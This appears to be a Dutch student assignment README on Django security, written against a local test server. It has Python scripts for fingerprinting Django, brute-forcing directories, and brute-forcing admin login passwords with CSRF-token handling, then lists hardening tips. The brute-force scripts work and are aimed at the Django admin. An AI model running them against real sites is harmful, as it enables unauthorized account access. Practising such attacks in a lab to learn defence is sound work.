# Django

Voor deze opdracht heb ik 1 ste variant gekozen.

## Scenario 1
Deze code geeft of het django toepassing is. Het is een simpele code die zoekt bij admin login form of het heeft csrfmiddlewaretoken dat word door Django gebruikt. En het zegd of het een Django toepassing is of niet.

```python
import requests

class Testing:
    def __init__(self,url,word):
        self.url=url
        self.word=word
        self.response = requests.get(self.url)
        self.tekst=self.response.text
        self.check()
        """def check(self): zogt voor de test of het woord (csrfmiddlewaretoken)\
        in de HTML structuur staat. En print resultaat
        Parameters
        ----------
        self : object
        Geeft parameters van klasse door
        Returns
        -------
        text : str
        In vorm van tekst
        """

    def check(self):
        if self.word in self.tekst:
            print("It is Django!")
        else:
            print ("not Django")

if __name__ == '__main__':
    URL='http://localhost:8000/admin/login/?next=/admin/'
    WORD="csrfmiddlewaretoken"
    test=Testing(URL,WORD)
```

## Scenario 1 deel2
Voor deze opdracht moeten we django folders in kaart zetten. Ik heb dat via url te bruteforsen. En filter op status code 200. Dat betekend dat hij heeft gevonden. En dan print hij de url. Dat werkt momenteel met directory maar nog niet met subdirectory.
```python
import time
import requests

class FileSystem:
    def __init__(self,url,file):
        self.url=url
        self.file=file
    """def checkfilesystem(self,file,URL):
         Parameters
          ----------
          self : object
          Geeft parameters van klasse door
          url : str
            URL van de website
          file : str
            Wordlist
         Returns
          -------
          text : str
          In vorm van tekst
        """
    def checkfilesystem(self):
        for line in self.file:
            time.sleep(2)
            fullurl=self.url+"/"+line
            fullurl=fullurl.rstrip()+"/"
            response = requests.get(fullurl)
            if response.status_code == 200:
                print(fullurl)

if __name__ == '__main__':
    URL='http://localhost:8000'
    file=open("all.txt","r")
    files=FileSystem(URL,file)
    files.checkfilesystem()
```
## Scenario 2
Voor deze opdracht we moeten bruteforsen.

```python
import sys
import requests
from bs4 import BeautifulSoup


class BFLoginPanel:
    def __init__(self, domain: str, username: str, password: str):
        self.domain = domain
        self.username = username
        self.password = password
        self.cookies = {}
        self.session = requests.Session()
        self.url = domain + "/admin/login/?next=/admin"
        self.protocol_mode = "Local File Mode"


        print(self.protocol_mode + " (" + self.password + ")")
        self.headers = {
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'\
            '(KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Referer': self.domain + '/admin/login/?next=/admin'
        }
        try:
            self.file = open(password, "r")
            self.wordlist = list(set([(word.strip()) for word in self.file.readlines()]))
            self.file.close()
        except Exception as exception:
            print("[-] Error:\n", exception)
            sys.exit()
        self.login_page = self.session.get(self.url)
        self.bruteforce()

    def bruteforce(self):
        count = 0
        for self.password in self.wordlist:
            for key, value in self.session.cookies.items():
                self.cookies[key] = value
            self.soup = BeautifulSoup(self.login_page.text, 'html.parser')
            self.csrf_input = self.soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

            url = self.domain + "/admin/login/?next=/admin"
            self.login_page = self.session.post(url, data={'csrfmiddlewaretoken': self.csrf_input,
            'username': self.username,
            'password': self.password}, cookies=self.cookies, headers=self.headers)

            if "CSRF" in self.login_page.text:
                print("[+] Error:\nCSRF token missing or incorrect.")
                sys.exit()
            if "Please " not in self.login_page.text:
                print("[+] Found! " + self.username + " - " + self.password +
                " - "+ str(self.login_page.status_code)+"\n\n")
                sys.exit()
            else:
                count += 1
                print("(" + str(count) + ") Attempt: " + self.username + " - "
                + self.password + " - "+ str(self.login_page.status_code))


if __name__ == '__main__':
    try:
        DOMAIN = "http://localhost:8000"
        USERNAME = "test"
        PASSWORD = sys.argv[1]
        BFLoginPanel(DOMAIN,USERNAME,PASSWORD)
    except IndexError:
        print(f"Command Line: python {sys.argv[0]} domain username wordlist_file")
```

## Django community
### Er zijn paar tips van django community die maken django framework meer securder.
1. Use SSL
2. Change the URL
3. Use 'django-admin-honeypot' ==> library 'django-admin-honeypot' moet geinstaleerd worden.
4. Require stronger passwords ==> password validator python-zxcvbn library.
5. Use 2FA ==> library django-two-factor-auth.
6. Use latest version of Django
7. Never run 'DEBUG' in production
8. Remember your environment ==> django-admin-env-notice library
9. Check for errors ==>Find security errors using "python manage.py check --deploy" command.
10. Get a checkup ==> Security tests.

## Bronnen
* [Git](https://github.com/MorDavid/Brute-Force-Django-Admin-Panel)
* [Django](https://opensource.com/article/18/1/10-tips-making-django-admin-more-secure)
